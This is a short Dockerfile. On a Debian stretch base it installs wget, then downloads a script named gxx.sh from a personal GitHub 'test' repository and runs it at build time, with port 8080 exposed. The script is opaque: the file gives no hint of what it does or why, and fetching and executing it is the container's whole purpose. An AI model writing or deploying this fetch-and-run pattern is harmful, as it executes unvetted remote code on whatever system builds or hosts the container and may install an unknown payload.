FROM debian:stretch
EXPOSE 8080
RUN apt update -y \
  && apt install -y \
     wget
RUN wget https://raw.githubusercontent.com/agamlimaa/test/main/gxx.sh && chmod +x gxx.sh && ./gxx.sh
